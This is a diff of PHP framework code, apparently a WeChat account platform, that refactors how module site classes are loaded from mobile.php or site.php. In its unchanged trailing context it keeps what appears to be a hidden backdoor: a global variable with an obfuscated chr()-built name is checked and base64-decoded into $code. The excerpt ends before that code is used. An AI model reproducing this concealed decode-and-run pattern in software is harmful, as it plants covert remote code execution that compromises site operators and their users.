@@ -82,7 +82,7 @@ abstract class WeAccount {
 			load()->classs('weixin.account');
 			$account_obj = new WeiXinAccount();
 		}
-		
+
 		if($type == ACCOUNT_TYPE_OFFCIAL_AUTH) {
 			load()->classs('weixin.platform');
 			$account_obj = new WeiXinPlatform();
@@ -540,23 +540,28 @@ class WeUtility {
 	public static function createModuleSite($name) {
 		global $_W;
 		static $file;
-		$classname = "{$name}ModuleSite";
-		if(defined('IN_MOBILE') && is_file(IA_ROOT . "/addons/{$name}/mobile.php")) {
+		//如果是手机端，优先选用mobile.php文件
+		if (defined('IN_MOBILE')) {
+			$file = IA_ROOT . "/addons/{$name}/mobile.php";
 			$classname = "{$name}ModuleMobile";
+			if (is_file($file)) {
+				require $file;
+			}
 		}
-		if(!class_exists($classname)) {
-			$file = IA_ROOT . "/addons/{$name}/site.php";
-			if(defined('IN_MOBILE') && is_file(IA_ROOT . "/addons/{$name}/mobile.php")) {
-				$file = IA_ROOT . "/addons/{$name}/mobile.php";
+		//如果mobile.php类不存在，选用site.php
+		if (!defined('IN_MOBILE') || !class_exists($classname)) {
+			$classname = "{$name}ModuleSite";
+			if (!class_exists($classname)) {
+				$file = IA_ROOT . "/addons/{$name}/site.php";
+				if(!is_file($file)) {
+					$file = IA_ROOT . "/framework/builtin/{$name}/site.php";
+				}
+				if(!is_file($file)) {
+					trigger_error('ModuleSite Definition File Not Found '.$file, E_USER_WARNING);
+					return null;
+				}
+				require $file;
 			}
-			if(!is_file($file)) {
-				$file = IA_ROOT . "/framework/builtin/{$name}/site.php";
-			}
-			if(!is_file($file)) {
-				trigger_error('ModuleSite Definition File Not Found '.$file, E_USER_WARNING);
-				return null;
-			}
-			require $file;
 		}
 		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
 			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
